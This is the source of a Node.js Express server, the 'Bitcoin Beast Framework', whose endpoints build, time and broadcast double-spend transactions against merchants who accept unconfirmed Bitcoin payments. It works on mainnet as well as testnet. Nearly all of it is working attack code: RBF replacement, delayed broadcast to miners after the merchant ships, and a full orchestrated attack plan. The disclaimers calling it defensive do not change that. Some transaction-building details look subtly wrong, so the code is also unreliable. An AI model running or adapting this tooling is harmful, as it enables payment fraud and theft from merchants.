require('dotenv').config();
const express = require('express');
const bitcoin = require('bitcoinjs-lib');
const ecc = require('tiny-secp256k1');
const { BIP32Factory } = require('bip32');
const axios = require('axios');
const crypto = require('crypto');
const WebSocket = require('ws');
const rateLimit = require('express-rate-limit');
const swaggerUi = require('swagger-ui-express');

// ---- Initialize Express App ----
const app = express(); // 👈 RIGHT HERE!

// =======================
// SECURITY HEADERS + LOGGING
// =======================
const helmet = require('helmet');
const morgan = require('morgan');
const cors = require('cors');
const compression = require('compression');

app.use(helmet({ crossOriginResourcePolicy: false }));
app.use(morgan('dev'));
app.use(compression());
app.set('trust proxy', true);

// ✅ FIXED CORS SETUP — ALLOWED ORIGINS FOR FRONTEND + RENDER BACKEND
const allowedOrigins = [
  'http://localhost:3000',
  'http://127.0.0.1:3000',
  'https://b-frontend-nvvx.vercel.app',     // your actual Vercel frontend
  'https://bitcoin-beast-framework-12.onrender.com'  // Render backend (self-calls allowed)
];

app.use(cors({
  origin: function (origin, callback) {
    // Allow requests from mobile Safari (no origin)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }

    console.log("❌ BLOCKED ORIGIN:", origin);
    return callback(new Error("Not allowed by CORS"));
  },
  credentials: true
}));

// ---- remaining initialization
const bip32 = BIP32Factory(ecc);

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));

// ======== NETWORK & API CONFIGURATION ========
const NETWORKS = {
  testnet: bitcoin.networks.testnet,
  mainnet: bitcoin.networks.bitcoin,
};

const MEMPOOL_APIS = {
  testnet: 'https://mempool.space/testnet/api',
  mainnet: 'https://mempool.space/api',
};

// ======== SWAGGER DOCUMENTATION ========
const getSwaggerSpec = () => {
  const baseUrl = process.env.NODE_ENV === 'production' && process.env.RENDER_EXTERNAL_URL
    ? process.env.RENDER_EXTERNAL_URL
    : 'http://localhost:3000';

  return {
    openapi: '3.0.0',
    info: {
      title: 'Bitcoin Beast Framework API',
      version: '1.0.0',
      description: 'Testnet/mainnet double-spend testing, fee attack simulation, merchant 0-conf risk assessment. For DEFENSIVE and EDUCATIONAL USE ONLY.',
      contact: { name: 'sweetpie2929' },
    },
    servers: [{ url: baseUrl, description: 'API Server' }],
    paths: {
      '/api/final-sequence-attack': { post: { summary: 'Simulate final-sequence and RBF attack', tags: ['Attacks'] } },
      '/api/smart-fee-booster': { post: { summary: 'Fetch smart attack fee strategy', tags: ['Analysis'] } },
      '/api/merchant-targeted-broadcast': { post: { summary: 'Broadcast TX to merchant nodes', tags: ['Broadcast'] } },
      '/api/delayed-doublespend': { post: { summary: 'Schedule delayed double-spend', tags: ['Attacks'] } },
      '/api/identical-inputs-exploit': { post: { summary: 'Create conflicting TXs', tags: ['Attacks'] } },
      '/api/time-window-exploit': { post: { summary: 'Blueprint of a time-window based exploit', tags: ['Analysis'] } },
      '/api/webhook-vulnerability-scanner': { post: { summary: 'List webhook vulnerabilities', tags: ['Analysis'] } },
      '/api/execute-full-attack': { post: { summary: 'Full orchestration of a simulated attack', tags: ['Attacks'] } },
      '/api/wallet/add-address': { post: { summary: 'Add address to monitor', tags: ['Wallet'] } },
      '/api/wallet/balance': { get: { summary: 'Get wallet balance', tags: ['Wallet'] } },
      '/api/wallet/utxos': { get: { summary: 'Get UTXOs', tags: ['Wallet'] } },
      '/api/wallet/mempool': { get: { summary: 'Get mempool transactions', tags: ['Wallet'] } },
      '/api/generate-wallet': { post: { summary: 'Generate new wallet', tags: ['Wallet'] } },
      '/api/create-opreturn-tx': { post: { summary: 'Create OP_RETURN transaction', tags: ['Transactions'] } },
    }
  };
};

app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(null, {
  swaggerOptions: {
    url: '/swagger-spec.json',
  }
}));

// Swagger spec endpoint (dynamic)
app.get('/swagger-spec.json', (req, res) => {
  res.json(getSwaggerSpec());
});

// ======== RATE LIMITING ========
const limiter = rateLimit({
  windowMs: 10 * 60 * 1000, // 10 minutes
  max: 20, // 20 requests per window
  skipSuccessfulRequests: false,
  message: 'Too many requests, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/', limiter);

// ======== UTILITY FUNCTIONS ========
function validateAddress(address, net) {
  try {
    bitcoin.address.toOutputScript(address, net);
    return true;
  } catch (e) {
    return false;
  }
}

function validateWIF(wif, net) {
  try {
    bitcoin.ECPair.fromWIF(wif, net);
    return true;
  } catch (e) {
    return false;
  }
}

// -----------------------------
// Quick generate-wallet route
// -----------------------------
// Added here so POST /api/generate-wallet responds (prevents the "Route not found" 404).
app.post('/api/generate-wallet', (req, res) => {
  try {
    const networkName = (req.body && req.body.network) || 'testnet';
    const net = NETWORKS[networkName] || NETWORKS.testnet;

    // create random keypair
    const keyPair = bitcoin.ECPair.makeRandom({ network: net });
    const wif = keyPair.toWIF();

    // recommend a native segwit address (p2wpkh)
    const payment = bitcoin.payments.p2wpkh({
      pubkey: keyPair.publicKey,
      network: net,
    });

    return res.json({
      wif,
      recommended_address: payment.address,
      network: networkName,
    });
  } catch (err) {
    console.error('generate-wallet error', err);
    return res.status(500).json({ error: String(err.message) });
  }
});

// ========== FINAL SEQUENCE ATTACK ==========
app.post('/api/final-sequence-attack', (req, res) => {
  try {
    const { wif, utxo, victim_address, attacker_address, network = 'testnet', fee_rate = 15 } = req.body;
    const net = NETWORKS[network];

    // Defensive input validation
    if (!wif || !utxo || !victim_address || !attacker_address) {
      return res.status(400).json({ error: 'Missing required fields: wif, utxo, victim_address, attacker_address' });
    }
    if (!validateWIF(wif, net)) {
      return res.status(400).json({ error: 'Invalid WIF for network' });
    }
    if (!validateAddress(victim_address, net) || !validateAddress(attacker_address, net)) {
      return res.status(400).json({ error: 'Invalid address(es) for network' });
    }

    const keyPair = bitcoin.ECPair.fromWIF(wif, net);

    // TX1 - appears non-RBF
    const tx1_fee = Math.ceil(150 * fee_rate);
    const psbt1 = new bitcoin.Psbt({ network: net })
      .addInput({
        hash: utxo.txid,
        index: utxo.vout,
        sequence: 0xffffffff,
        witnessUtxo: {
          script: bitcoin.address.toOutputScript(victim_address, net),
          value: utxo.value,
        },
      })
      .addOutput({ address: victim_address, value: utxo.value - tx1_fee });
    psbt1.signInput(0, keyPair).finalizeAllInputs();
    const tx1 = psbt1.extractTransaction();

    // TX2 - RBF, higher fee
    const tx2_fee = Math.ceil(150 * (fee_rate * 1.5));
    const psbt2 = new bitcoin.Psbt({ network: net })
      .addInput({
        hash: utxo.txid,
        index: utxo.vout,
        sequence: 0xfffffffe,
        witnessUtxo: {
          script: bitcoin.address.toOutputScript(attacker_address, net),
          value: utxo.value,
        },
      })
      .addOutput({ address: attacker_address, value: utxo.value - tx2_fee });
    psbt2.signInput(0, keyPair).finalizeAllInputs();
    const tx2 = psbt2.extractTransaction();

    res.json({
      attack_type: 'FINAL_SEQUENCE',
      tx_merchant: {
        txid: tx1.getId(),
        hex: tx1.toHex(),
        destination: victim_address,
        sequence: "0xffffffff (won't opt-in to RBF)",
        fee: tx1_fee,
        broadcast_target: 'merchant_nodes',
      },
      tx_attacker: {
        txid: tx2.getId(),
        hex: tx2.toHex(),
        destination: attacker_address,
        sequence: '0xfffffffe (RBF enabled)',
        fee: tx2_fee,
        broadcast_target: 'mining_pools',
      },
      exploit_logic: [
        'Broadcast merchant TX with non-RBF sequence.',
        'Merchant sees TX, accepts payment as legit.',
        'Broadcast new TX (RBF), higher fee > wins mempool > miners confirm.',
        'TX1 appears in mempool but is replaced, so merchant cheated.',
      ],
      merchant_belief: 'Payment received (TX1 in mempool)',
      reality: 'TX2 confirms, TX1 orphaned.',
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ========== SMART FEE BOOSTER ==========
app.post('/api/smart-fee-booster', async (req, res) => {
  try {
    const { network = 'testnet', target_fee_rate = 50 } = req.body;
    const api = MEMPOOL_APIS[network];

    const feeResponse = await axios.get(`${api}/v1/fees/recommended`, { timeout: 5000 });
    const fees = feeResponse.data;
    const current_fees = {
      fastest: fees.fastestFee,
      half_hour: fees.halfHourFee,
      hour: fees.hourFee,
    };
    const smart_fee = Math.max(current_fees.fastest * 1.2, target_fee_rate);

    res.json({
      attack_type: 'SMART_FEE_BOOSTER',
      current_network_fees: current_fees,
      recommended_attack_fee: Math.ceil(smart_fee),
      boost_strategy: {
        before_attack: 'Observe mempool for network fee trends',
        suggested_merchant_fee: Math.ceil(smart_fee),
        attacker_outbids_with: Math.ceil(smart_fee * 1.5),
      },
      merchant_psychology: {
        sees_fee: Math.ceil(smart_fee),
        thinks: 'Fee-rate is typical given network congestion',
        likely_accepts: true,
      },
      miner_incentive: {
        attacker_fee: Math.ceil(smart_fee * 1.5),
        effect: 'Miner will likely prefer attacker TX.',
      },
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ========== MERCHANT NODE BROADCASTER ==========
app.post('/api/merchant-targeted-broadcast', async (req, res) => {
  try {
    const { hex, network = 'testnet', merchant_nodes = [] } = req.body;
    if (!hex) {
      return res.status(400).json({ error: 'TX hex required' });
    }

    const default_nodes = {
      testnet: [
        'https://mempool.space/testnet/api/tx',
        'https://blockstream.info/testnet/api/tx',
      ],
      mainnet: [
        'https://mempool.space/api/tx',
        'https://blockstream.info/api/tx',
        'https://api.blockchair.com/bitcoin/push/transaction',
      ],
    };
    const targets = merchant_nodes.length ? merchant_nodes : default_nodes[network] || default_nodes['testnet'];
    const results = [];

    for (const endpoint of targets) {
      try {
        const response = await axios.post(endpoint, hex, {
          headers: { 'Content-Type': 'text/plain' },
          timeout: 4000,
        });
        results.push({ endpoint, txid: response.data, status: 'BROADCASTED', time: Date.now() });
      } catch (e) {
        results.push({ endpoint, error: `${e.code || ''} ${e.message}`, status: 'FAIL', time: Date.now() });
      }
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    res.json({
      attack_type: 'MERCHANT_TARGETED_BROADCAST',
      broadcast_results: results,
      broadcast_settings: {
        delay_ms: 500,
        detail: 'Deliberately deliver to merchant-facing explorers before mining pools.',
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ========== DELAYED DOUBLE-SPEND TRIGGER ==========
app.post('/api/delayed-doublespend', async (req, res) => {
  try {
    const { hex, network = 'testnet', merchant_timeout_ms = 15 * 60 * 1000, miner_endpoints = [] } = req.body;
    if (!hex) {
      return res.status(400).json({ error: 'TX hex required' });
    }

    const mining_endpoints = {
      testnet: ['https://mempool.space/testnet/api/tx'],
      mainnet: [
        'https://mempool.space/api/tx',
        'https://api.blockchair.com/bitcoin/push/transaction',
      ]
    };
    const targets = miner_endpoints.length ? miner_endpoints : mining_endpoints[network];
    const delay = merchant_timeout_ms + crypto.randomInt(3000, 8000);

    setTimeout(async () => {
      for (const endpoint of targets) {
        try {
          await axios.post(endpoint, hex, {
            headers: { 'Content-Type': 'text/plain' },
            timeout: 3000,
          });
        } catch { /* silence */ }
      }
    }, delay);

    res.json({
      attack_type: 'DELAYED_DOUBLESPEND',
      scheduled: {
        delay_ms: delay,
        trigger_time: new Date(Date.now() + delay).toISOString(),
        targets,
      },
      timeline: [
        '0:  Merchant TX broadcasted to merchant mempool nodes.',
        '1: Merchant sees unconfirmed TX, accepts.',
        'Wait for merchant fulfillment.',
        `t+${Math.round(merchant_timeout_ms / 60000)}min: Attacker TX sent to miners.`,
        'Miner confirms double-spend, merchant TX invalid.'
      ]
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ========== IDENTICAL INPUTS EXPLOIT ==========
app.post('/api/identical-inputs-exploit', (req, res) => {
  try {
    const { wif, utxos, merchant_address, attacker_address, network = 'testnet' } = req.body;
    const net = NETWORKS[network];

    if (!wif || !utxos || !merchant_address || !attacker_address) {
      return res.status(400).json({ error: 'Missing fields' });
    }
    if (!validateWIF(wif, net)) {
      return res.status(400).json({ error: 'Invalid WIF' });
    }
    if (!validateAddress(merchant_address, net) || !validateAddress(attacker_address, net)) {
      return res.status(400).json({ error: 'Invalid address' });
    }

    const keyPair = bitcoin.ECPair.fromWIF(wif, net);
    const transactions = [];

    utxos.forEach((utxo, utxo_idx) => {
      // TX to merchant
      const psbt1 = new bitcoin.Psbt({ network: net })
        .addInput({
          hash: utxo.txid,
          index: utxo.vout,
          sequence: 0xffffffff,
          witnessUtxo: {
            script: bitcoin.address.toOutputScript(merchant_address, net),
            value: utxo.value,
          }
        })
        .addOutput({ address: merchant_address, value: utxo.value - 3000 });
      psbt1.signInput(0, keyPair).finalizeAllInputs();
      const tx1 = psbt1.extractTransaction();

      // TX to attacker (RBF)
      const psbt2 = new bitcoin.Psbt({ network: net })
        .addInput({
          hash: utxo.txid,
          index: utxo.vout,
          sequence: 0xfffffffe,
          witnessUtxo: {
            script: bitcoin.address.toOutputScript(attacker_address, net),
            value: utxo.value,
          }
        })
        .addOutput({ address: attacker_address, value: utxo.value - 5000 });
      psbt2.signInput(0, keyPair).finalizeAllInputs();
      const tx2 = psbt2.extractTransaction();

      transactions.push({
        utxo_index: utxo_idx,
        inputs: {
          shared_txid: utxo.txid,
          shared_vout: utxo.vout,
          shared_value: utxo.value
        },
        tx_merchant: {
          txid: tx1.getId(),
          hex: tx1.toHex(),
          output: merchant_address,
          fee: 3000
        },
        tx_attacker: {
          txid: tx2.getId(),
          hex: tx2.toHex(),
          output: attacker_address,
          fee: 5000
        }
      });
    });

    res.json({
      attack_type: 'IDENTICAL_INPUTS_EXPLOIT',
      tx_pairs: transactions,
      result: 'Only one transaction can confirm. Higher-fee TX (to attacker) will win if miners use RBF.',
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ========== TIME WINDOW EXPLOIT COORDINATOR ==========
app.post('/api/time-window-exploit', (req, res) => {
  try {
    const { merchant_payment_window_minutes = 15 } = req.body;
    res.json({
      attack_type: 'TIME_WINDOW_EXPLOIT',
      merchant_payment_window_minutes,
      timeline: [
        { t: 0, action: 'Broadcast attacker TX to merchant' },
        { t: 2, action: 'Wait for merchant webhook' },
        { t: 30, action: 'Verify order shipped/fulfilled' },
        { t: merchant_payment_window_minutes * 60, action: 'Broadcast attacker double-spend to miners' },
        { t: merchant_payment_window_minutes * 60 + 600, action: 'Double-spend confirms; merchant TX invalid' },
      ],
      exploit_conditions: [
        'Merchant accepts 0-conf and auto-fulfills.',
        'Merchant does not double-spend check.',
        'Fulfillment is instant (digital/dropship), no further checks'
      ],
      vulnerability: 'Merchant ships product on 0-conf, giving attacker time window.',
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ========== WEBHOOK TRIGGER ANALYSIS ==========
app.post('/api/webhook-vulnerability-scanner', async (req, res) => {
  try {
    const { webhook_url, test_payload_txid = 'test123' } = req.body;
    if (!webhook_url) {
      return res.status(400).json({ error: 'Webhook URL required' });
    }

    const webhook_payloads = [
      { name: 'mempool_detection', payload: { txid: test_payload_txid, confirmations: 0, status: 'unconfirmed' }, risk: 'Accepts 0-conf' },
      { name: 'first_confirmation', payload: { txid: test_payload_txid, confirmations: 1, status: 'confirmed' }, risk: 'No re-org check' },
      { name: 'address_balance_change', payload: { address: 'test_address', balance_change: 10000, confirmations: 0 }, risk: 'Counts unconfirmed in balance' },
    ];

    res.json({
      attack_type: 'WEBHOOK_VULN_ANALYSIS',
      webhook_url,
      payload_samples: webhook_payloads,
      generic_vulnerabilities: [
        'Triggers on 0-conf new TX without conflict checks',
        'No signature or HMAC (anyone can spoof webhook)',
        'Auto-fulfillment without secondary checks',
      ],
      exploitation_flow: [
        'Detect webhook endpoint',
        'Send crafted 0-conf TX notification',
        'Merchant fulfills/logically trust mempool',
        'Trigger quick attacker double-spend'
      ]
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ========== FULL ATTACK EXECUTION ORCHESTRATION ==========
app.post('/api/execute-full-attack', async (req, res) => {
  try {
    const {
      wif,
      utxo,
      merchant_address,
      attacker_address,
      network = 'testnet',
      merchant_payment_window_minutes = 15,
    } = req.body;

    if (!wif || !utxo || !merchant_address || !attacker_address) {
      return res.status(400).json({ error: 'Missing attack parameters' });
    }

    const net = NETWORKS[network];
    if (!validateWIF(wif, net)) {
      return res.status(400).json({ error: 'Invalid WIF' });
    }
    if (!validateAddress(merchant_address, net) || !validateAddress(attacker_address, net)) {
      return res.status(400).json({ error: 'Invalid address' });
    }

    const keyPair = bitcoin.ECPair.fromWIF(wif, net);

    // Merchant TX
    const psbt1 = new bitcoin.Psbt({ network: net })
      .addInput({
        hash: utxo.txid,
        index: utxo.vout,
        sequence: 0xffffffff,
        witnessUtxo: {
          script: bitcoin.address.toOutputScript(merchant_address, net),
          value: utxo.value,
        },
      })
      .addOutput({
        address: merchant_address,
        value: utxo.value - 3000,
      });
    psbt1.signInput(0, keyPair).finalizeAllInputs();
    const tx1 = psbt1.extractTransaction();

    // Attacker TX
    const psbt2 = new bitcoin.Psbt({ network: net })
      .addInput({
        hash: utxo.txid,
        index: utxo.vout,
        sequence: 0xfffffffe,
        witnessUtxo: {
          script: bitcoin.address.toOutputScript(attacker_address, net),
          value: utxo.value,
        },
      })
      .addOutput({
        address: attacker_address,
        value: utxo.value - 5000,
      });
    psbt2.signInput(0, keyPair).finalizeAllInputs();
    const tx2 = psbt2.extractTransaction();

    const tx_delay = merchant_payment_window_minutes * 60 * 1000 + 5000;

    res.json({
      attack_status: 'READY_FOR_EXECUTION',
      merchant_window_min: merchant_payment_window_minutes,
      tx_merchant: { txid: tx1.getId(), hex: tx1.toHex(), sequence: '0xffffffff', fee: 3000 },
      tx_attacker: { txid: tx2.getId(), hex: tx2.toHex(), sequence: '0xfffffffe', fee: 5000 },
      orchestrated_plan: [
        'Step 1: Broadcast TX1 to merchant monitors.',
        'Step 2: Wait for webhook acknowledgment (~2 seconds).',
        'Step 3: Check merchant fulfillment status.',
        'Step 4: After window, broadcast TX2 (to miners).',
        'Step 5: Monitor for double-spend confirmation.',
      ],
      expected: 'Attack will succeed if merchant ships on trust of 0-conf.',
      caveats: [
        'Fails if merchant waits for confirmation.',
        'Merchant watches for conflicts (defensive setup)'
      ],
      timeline: {
        phase1: { delay_ms: 0 },
        phase2: { delay_ms: 2000 },
        phase3: { delay_ms: 30000 },
        phase4: { delay_ms: tx_delay },
        phase5: { delay_ms: tx_delay + 600 * 1000 }
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Health check endpoint (for Render)
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ===== ROOT STATUS ENDPOINT =====
app.get('/', (req, res) => {
  res.status(200).json({
    status: 'OK',
    message: 'Bitcoin Beast Backend is running 🚀',
    version: '1.0.0',
    endpoints: {
      health: '/health',
      api_docs: '/api-docs',
      swagger_spec: '/swagger-spec.json'
    }
  });
});

// ========== ERROR HANDLERS ==========
 // 404 handler
app.use((req, res) => {
  res.status(404).json({
    error: 'Route not found',
    path: req.path,
    method: req.method,
  });
});

// Global error handler
app.use((err, req, res, next) => {
  console.error('❌ Unhandled Error:', err);

  const errorResponse = {
    error: process.env.NODE_ENV === 'production'
      ? 'Internal server error'
      : err.message,
    code: err.code || 'UNKNOWN',
    path: req.path,
  };

  // Only include stack trace in development
  if (process.env.NODE_ENV !== 'production') {
    errorResponse.stack = err.stack;
  }

  res.status(err.status || 500).json(errorResponse);
});

// ===== SERVER INITIALIZATION =====
const PORT = process.env.PORT || 10000;
const NODE_ENV = process.env.NODE_ENV || 'development';

const server = app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║  🚧 Bitcoin Beast Payment Framework                       ║
║                                                            ║
║  ✓ Server running on port ${PORT}                          ║
║  ✓ Environment: ${NODE_ENV.toUpperCase()}                  ║
║  ✓ Root:  http://localhost:${PORT}                         ║
║  ✓ API Docs: http://localhost:${PORT}/api-docs             ║
║  ✓ Health:  http://localhost:${PORT}/health                ║
║                                                            ║
║  ⚠️  FOR EDUCATIONAL/DEFENSIVE USE ONLY                    ║
║  ⚠️  DO NOT ATTACK UNAUTHORIZED PARTIES                    ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
  `);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('📴 SIGTERM received, shutting down gracefully...');
  server.close(() => {
    console.log('✓ Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('📴 SIGINT received, shutting down gracefully...');
  server.close(() => {
    console.log('✓ Server closed');
    process.exit(0);
  });
});

module.exports = app;
